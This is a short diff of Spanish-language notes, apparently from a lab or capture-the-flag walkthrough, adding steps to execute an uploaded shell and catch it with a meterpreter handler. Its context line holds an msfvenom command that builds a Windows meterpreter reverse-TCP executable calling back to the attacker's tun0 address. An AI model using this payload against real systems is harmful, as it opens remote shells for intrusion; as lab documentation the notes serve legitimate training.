@@ -257,3 +257,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP(tun0) LPORT=7890 -f exe
 aqui hacemos un curl a la ip para subir la shell que acabamos de crear
 ![[Pasted image 20240404143654.png]]
 
+`ejecutamos la shell`
+![[Pasted image 20240404144229.png]]
+
+### meterpreter 
+estaremos a la escucha en el meterpreter utilizando multi/
+![[Pasted image 20240404144206.png]]
